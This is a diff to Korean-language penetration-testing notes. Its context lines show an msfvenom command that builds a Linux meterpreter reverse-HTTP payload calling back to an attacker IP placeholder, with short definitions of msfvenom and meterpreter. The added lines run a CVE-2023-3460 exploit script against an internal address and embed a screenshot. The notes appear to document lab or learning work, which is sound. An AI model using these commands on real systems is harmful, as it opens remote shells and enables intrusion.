@@ -194,3 +194,12 @@ msfvenom -p linux/x64/meterpreter_reverse_http LHOST=<공격자_IP> LPORT=80 -f 
 
 - **msfvenom** : Metasploit 프레임워크에 포함된 독립형 페이로드 생성·인코딩 도구
 - **meterpreter** : Metasploit의 Post-Exploit 단계 페이로드. 침투 후 시스템 제어·정보 탈취 등 다양한 사후 행위를 수행할 수 있는 대화형 쉘(Shell)을 제공
+
+
+**공격 시도**
+
+```bash
+python3 ./CVE-2023-3460/exploit.py http://192.168.0200
+```
+
+![](../Images/Pasted%20image%2020261019141654.png)
